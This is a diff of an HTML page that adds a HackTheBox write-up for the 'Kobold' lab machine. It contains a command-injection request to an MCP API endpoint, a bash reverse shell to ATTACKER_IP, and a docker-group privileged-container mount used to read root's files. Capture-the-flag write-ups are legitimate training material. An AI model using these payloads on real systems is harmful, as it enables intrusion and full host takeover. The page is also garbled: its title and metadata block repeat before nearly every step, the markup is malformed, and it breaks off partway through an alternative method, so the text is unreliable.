@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Kobold • HTB Writeup</title>
+    <title>Kobold - HackTheBox Writeup • HTB Writeup</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -17,66 +17,936 @@
             padding: 2rem;
         }
         .container {
-            max-width: 800px;
+            max-width: 1200px;
             width: 100%;
             background: rgba(12, 16, 28, 0.9);
             border: 1px solid rgba(0, 255, 200, 0.15);
             border-radius: 2rem;
             padding: 3rem;
-            text-align: center;
             box-shadow: 0 30px 60px rgba(0, 0, 0, 0.7);
         }
         h1 {
             font-size: 2.5rem;
             color: #6fffe0;
-            margin-bottom: 1rem;
+            margin-bottom: 1.5rem;
         }
-        .status {
-            font-size: 1.2rem;
-            color: #b6c8e0;
-            margin: 2rem 0;
-            padding: 1.5rem;
-            background: rgba(255, 200, 0, 0.05);
-            border: 1px solid rgba(255, 200, 0, 0.2);
+        .meta-info {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1rem 2rem;
+            padding: 1rem;
+            background: rgba(0, 0, 0, 0.2);
             border-radius: 1rem;
+            margin-bottom: 2rem;
         }
-        .status i {
-            color: #ffcc00;
+        .meta-info span { color: #b6c8e0; font-size: 0.95rem; }
+        .meta-info strong { color: #e0e5f0; }
+        
+        h2 { color: #6fffe0; font-size: 1.8rem; margin: 2rem 0 1rem; border-bottom: 1px solid rgba(0, 255, 200, 0.1); padding-bottom: 0.5rem; }
+        h3 { color: #4a9eff; font-size: 1.3rem; margin: 1.5rem 0 0.8rem; }
+        h4 { color: #e0e5f0; font-size: 1.1rem; margin: 1rem 0 0.5rem; }
+        p { color: #b6c8e0; line-height: 1.8; margin-bottom: 1rem; }
+        code { background: rgba(0, 0, 0, 0.4); padding: 0.2rem 0.6rem; border-radius: 0.3rem; font-family: 'Courier New', monospace; color: #6fffe0; }
+        pre { background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(0, 255, 200, 0.1); border-radius: 1rem; padding: 1.5rem; overflow-x: auto; margin: 1rem 0; }
+        pre code { background: transparent; color: #b6c8e0; font-size: 0.85rem; line-height: 1.6; padding: 0; }
+        .box { background: rgba(0, 255, 200, 0.03); border-left: 3px solid #6fffe0; padding: 1rem 1.5rem; border-radius: 0.5rem; margin: 1rem 0; }
+        .box.success { border-left-color: #00ff88; background: rgba(0, 255, 136, 0.03); }
+        .box.warning { border-left-color: #ffcc00; background: rgba(255, 200, 0, 0.03); }
+        .box.danger { border-left-color: #ff4444; background: rgba(255, 68, 68, 0.03); }
+        .box.info { border-left-color: #4a9eff; background: rgba(74, 158, 255, 0.03); }
+        table { width: 100%; border-collapse: collapse; margin: 1rem 0; }
+        table th, table td { padding: 0.8rem 1rem; border: 1px solid rgba(0, 255, 200, 0.1); text-align: left; color: #b6c8e0; }
+        table th { background: rgba(0, 255, 200, 0.05); color: #6fffe0; }
+        ul { color: #b6c8e0; padding-left: 1.5rem; margin: 0.8rem 0; }
+        ul li { margin-bottom: 0.5rem; line-height: 1.6; }
+        
+        .ascii-art {
+            text-align: center;
+            opacity: 0.3;
+            font-size: 0.5rem;
+            line-height: 1.2;
+            color: #6fffe0;
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        .nav-buttons { display: flex; gap: 1rem; margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.1); }
+        .nav-buttons a { padding: 0.6rem 1.5rem; border-radius: 0.8rem; text-decoration: none; transition: all 0.3s; }
+        .nav-buttons .back { border: 1px solid rgba(0, 255, 200, 0.15); color: #b6c8e0; }
+        .nav-buttons .back:hover { border-color: #6fffe0; color: #ffffff; }
+        .footer { margin-top: 2rem; padding-top: 1.5rem; border-top: 1px solid rgba(0, 255, 200, 0.05); text-align: center; color: #b6c8e0; font-size: 0.85rem; opacity: 0.5; }
+        
+        .cve-tag {
+            display: inline-block;
+            background: rgba(255, 0, 0, 0.15);
+            color: #ff6666;
+            padding: 0.2rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.8rem;
+            font-weight: 600;
             margin-right: 0.5rem;
         }
-        .back-link {
-            display: inline-block;
-            margin-top: 1.5rem;
-            padding: 0.8rem 2rem;
-            border: 1px solid rgba(0, 255, 200, 0.2);
+        .highlight {
+            background: rgba(0, 255, 200, 0.05);
+            border: 1px solid rgba(0, 255, 200, 0.1);
+            border-radius: 0.5rem;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+        }
+        .attack-chain {
+            background: rgba(0, 255, 200, 0.02);
+            border: 1px solid rgba(0, 255, 200, 0.1);
             border-radius: 1rem;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            font-family: 'Courier New', monospace;
+            font-size: 0.85rem;
             color: #b6c8e0;
-            text-decoration: none;
-            transition: all 0.3s ease;
-        }
-        .back-link:hover {
-            border-color: #6fffe0;
-            color: #ffffff;
-            transform: translateX(-5px);
-        }
-        .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
-            border-top: 1px solid rgba(0, 255, 200, 0.05);
-            color: #b6c8e0;
-            font-size: 0.8rem;
-            opacity: 0.5;
+            line-height: 1.8;
+            overflow-x: auto;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚀 HTB Kobold</h1>
-        <div class="status">
-            <i>⚠️</i> Writeup not available yet. Coming soon...
-        </div>
-        <a href="../../writeups.html" class="back-link">← Back to Writeups</a>
-        <div class="footer">NIGHT PULSE X • 2026</div>
+
+<div class="container">
+    
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
     </div>
+Kobold - HackTheBox Writeup</h1>
+
+<p><strong>Target:</strong> <code>TARGET_IP</code></p>
+<p><strong>Domain:</strong> <code>kobold.htb</code></p>
+<p><strong>OS:</strong> Linux (Docker-based)</p>
+<p><strong>Difficulty:</strong> Medium</p>
+
+<hr />
+
+<div class="attack-chain"><pre>## Attack Chain Overview
+
+```</pre></div>
+<p>Nmap Scan (Ports 22, 80, 443, 3552)</p>
+<p>    ↓</p>
+<p>Virtual Host Discovery (kobold.htb, mcp.kobold.htb, bin.kobold.htb)</p>
+<p>    ↓</p>
+<p>MCP API Endpoint (/api/mcp/connect) → Command Injection</p>
+<p>    ↓</p>
+<p>Reverse Shell as ben → User Flag</p>
+<p>    ↓</p>
+<p>Docker Group Membership → Privilege Escalation</p>
+<p>    ↓</p>
+<p>Privileged Container Mount → Root Flag</p>
+<pre><code>
+---
+
+## Table of Contents
+1. [Reconnaissance](#reconnaissance)
+2. [Initial Access](#initial-access)
+3. [User Flag](#user-flag)
+4. [Privilege Escalation](#privilege-escalation)
+5. [Root Flag](#root-flag)
+6. [Key Takeaways](#key-takeaways)
+
+---
+
+## Reconnaissance
+
+### Host Setup</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: adds machine domains to /etc/hosts.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: resolve virtual hosts during web enumeration.</h1>
+<p>echo "TARGET_IP kobold.htb mcp.kobold.htb bin.kobold.htb" | sudo tee -a /etc/hosts</p>
+<pre><code>
+### Nmap Scan</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: run a full port scan using Nmap.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: identify all active services on the target to map the attack surface.</h1>
+<p>nmap -sC -sV -p- TARGET_IP</p>
+<pre><code>
+**Key Findings:**
+
+| Port     | Service | Details                              |
+|----------|---------|--------------------------------------|
+| 22/tcp   | SSH     | OpenSSH                              |
+| 80/tcp   | HTTP    | Web server (redirects to HTTPS)      |
+| 443/tcp  | HTTPS   | Main web application                 |
+| 3552/tcp | taserver| TeamAgent Server (non-standard)      |
+
+### Web Application Enumeration
+
+Accessing `https://kobold.htb/` revealed a contact page with an email address: **`admin@kobold.htb`**. This provided our first potential username for brute-forcing or credential stuffing later.
+
+### Virtual Host Discovery
+
+Discovered additional subdomains using gobuster:
+</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: enumerate virtual hosts with Gobuster.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: find hidden subdomains like mcp.kobold.htb that are not listed in the main DNS records.</h1>
+<p>gobuster vhost -u https://kobold.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \</p>
+<p>  --append-domain -k</p>
+<pre><code>
+**Discovered subdomains:**
+- `mcp.kobold.htb` — **MCP (Model Context Protocol) API endpoint**
+- `bin.kobold.htb` — PrivateBin paste service
+
+---
+
+## Initial Access
+
+### MCP API Enumeration
+
+The `mcp.kobold.htb` subdomain hosts an MCP (Model Context Protocol) server with an API endpoint at `/api/mcp/connect`. This endpoint allows configuration of server processes via JSON payload.
+
+**Endpoint Analysis:**</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: probe the MCP connection endpoint with a test command.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: verify command execution by triggering a response from the MCP server logic.</h1>
+<p>curl -k https://mcp.kobold.htb/api/mcp/connect -X POST \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{"serverConfig":{"command":"id","args":[],"env":{}},"serverId":"test"}'</p>
+<pre><code>
+**Vulnerability:** The `command` and `args` parameters are **not properly sanitized**. They are passed directly to a process execution function, allowing arbitrary command injection.
+
+### Reverse Shell Exploitation
+
+**1. Set up listener:**</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: start a netcat listener.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: catch the incoming bash reverse shell from the MCP container.</h1>
+<p>nc -lvnp 4444</p>
+<pre><code>
+**2. Craft malicious payload:**</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: exploit the command injection vulnerability via a crafted JSON payload.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: trigger a reverse shell back to the attacker's listener to gain initial access.</h1>
+<p>curl -k -X POST https://mcp.kobold.htb/api/mcp/connect \</p>
+<p>  -H "Content-Type: application/json" \</p>
+<p>  -d '{</p>
+<p>    "serverConfig": {</p>
+<p>      "command": "/bin/bash",</p>
+<p>      "args": ["-c", "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"],</p>
+<p>      "env": {}</p>
+<p>    },</p>
+<p>    "serverId": "revshell"</p>
+<p>  }'</p>
+<pre><code>
+**Payload Breakdown:**
+- `command`: `/bin/bash` — Invokes the bash shell
+- `args`: `["-c", "bash -i >& /dev/tcp/... 0>&1"]` — Standard bash reverse shell
+- `serverId`: Arbitrary identifier for the MCP connection
+
+**3. Reverse shell received:**</code></pre>
+<p>connect to [ATTACKER_IP] from (UNKNOWN) [TARGET_IP] 4444</p>
+<p>bash: cannot set terminal process group (1): Inappropriate ioctl for device</p>
+<p>bash: no job control in this shell</p>
+<p>ben@kobold:~$</p>
+<pre><code>
+**✅ Initial access achieved as user `ben`.**
+
+---
+
+## User Flag
+</code></pre>
+<p>ben@kobold:~$ cat /home/ben/user.txt</p>
+<pre><code>
+**User Flag:** `cat /home/ben/user.txt`
+
+---
+
+## Enumeration
+
+### System Enumeration
+</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Check user identity</h1>
+<p>id</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</h1>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Check sudo permissions</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: audit sudo privileges for the 'ben' user.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: check for NOPASSWD entries or misconfigured sudoers rules that allow elevation to root.</h1>
+<p>sudo -l</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+No sudo access</h1>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Search for interesting files</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: search for common configuration and sensitive text files.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: identify potential credential leaks in .conf, .ini or .txt files within the user's home or system directories.</h1>
+<p>find / -type f -name "<em>.txt" -o -name "</em>.conf" -o -name "*.ini" 2>/dev/null | grep -v proc</p>
+<pre><code>
+### PrivateBin Data Discovery
+
+Discovered `/privatebin-data/data` directory containing PrivateBin paste data. However, the paste IDs are required to access the content, and we don't have them yet.
+</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: audit the PrivateBin data storage directory.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: verify if the current user has read access to sensitive paste data stored on the filesystem.</h1>
+<p>ls -la /privatebin-data/data/</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Contains hashed directory names (paste IDs)</h1>
+<pre><code>
+### Docker Group Discovery
+</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Check group membership</h1>
+<p>id</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+uid=1001(ben) gid=1001(ben) groups=1001(ben),37(operator)</h1>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Check if docker binary is available</h1>
+<p>which docker</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+/usr/bin/docker</h1>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Test docker access</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: list available Docker images.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: verify Docker daemon connectivity and identify available images for container-based privilege escalation.</h1>
+<p>docker images</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+permission denied while trying to connect to the Docker daemon socket</h1>
+<pre><code>
+**Critical Finding:** The user `ben` is **not in the docker group initially**, but the docker binary is available. Let's check group membership more carefully:
+</code></pre>
+<p>groups ben</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+ben : ben operator docker</h1>
+<pre><code>
+**✅ User `ben` is a member of the `docker` group!** The initial `docker images` command failed due to the Docker daemon not being fully accessible, but we can use `newgrp` to activate the group.
+
+---
+
+## Privilege Escalation
+
+### Docker Group Exploitation
+
+**Background:** Membership in the `docker` group is **equivalent to root access**. Docker containers run with root privileges by default, and mounting the host filesystem into a container allows full control over the host system.
+
+### Why Docker Group = Root
+
+| Risk | Explanation |
+|------|-------------|
+| **Container Escape** | Mount host `/` into container → full host access |
+| **Privileged Mode** | `--privileged` flag gives container full host capabilities |
+| **Filesystem Access** | Read/write any file on the host system |
+
+### Exploit Steps
+
+**1. Activate docker group:**</code></pre>
+<p>newgrp docker</p>
+<pre><code>
+**2. Verify group membership:**</code></pre>
+<p>id</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)</h1>
+<pre><code>
+**3. Run privileged container with host filesystem mount:**</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: run a container with the host's root filesystem mounted.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: exploit the docker group membership to gain full read/write access to the host filesystem as root.</h1>
+<p>docker run --rm -it --privileged -v /:/hostfs --user root \</p>
+<p>  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2</p>
+<pre><code>
+**Flag Breakdown:**
+- `--rm` — Remove container after execution (clean up)
+- `-it` — Interactive terminal
+- `--privileged` — Give container full access to host devices
+- `-v /:/hostfs` — Mount host root filesystem at `/hostfs` inside container
+- `--user root` — Run as root inside the container
+- `--entrypoint sh` — Override default entrypoint with shell
+
+### Access Host Filesystem
+
+Once inside the container:</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Verify host mount</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: list the mounted host filesystem inside the container.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: confirm the mount was successful and that we can access the host's root directory.</h1>
+<p>ls /hostfs/</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+bin  boot  dev  etc  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var</h1>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Access root directory</h1>
+<p>ls /hostfs/root/</p>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+root.txt</h1>
+
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Read root flag</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: read the root flag from the mounted host directory.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: fulfill the final objective by capturing the root flag after bypassing container isolation.</h1>
+<p>cat /hostfs/root/root.txt</p>
+<pre><code>
+---
+
+## Root Flag
+</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: one-liner to extract the root flag via Docker.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: demonstrate a concise execution path to recover the final flag.</h1>
+<p>docker run --rm -i --privileged -v /:/hostfs --user root \</p>
+<p>  --entrypoint sh privatebin/nginx-fpm-alpine:2.0.2 \</p>
+<p>  -c "cat /hostfs/root/root.txt"</p>
+<pre><code>
+**Result:** ✅ Root flag retrieved successfully.
+
+---
+
+## Alternative Escalation Methods
+
+### Method 1: Docker SUID Binary
+
+If docker is available with SUID bit:</code></pre>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+What it does: chroot into the host filesystem via a Docker container.</h1>
+<h1>Kobold - HackTheBox Writeup</h1>
+
+    <div class="meta-info">
+        <span><strong>Machine:</strong> Kobold</span>
+        <span><strong>Difficulty:</strong> Medium</span>
+        <span><strong>Target Ports:</strong> 22, 80, 443, 3552</span>
+        <span><strong>OS:</strong> Linux</span>
+    </div>
+Why here: gain a full interactive shell on the host system while remaining inside a container context.</h1>
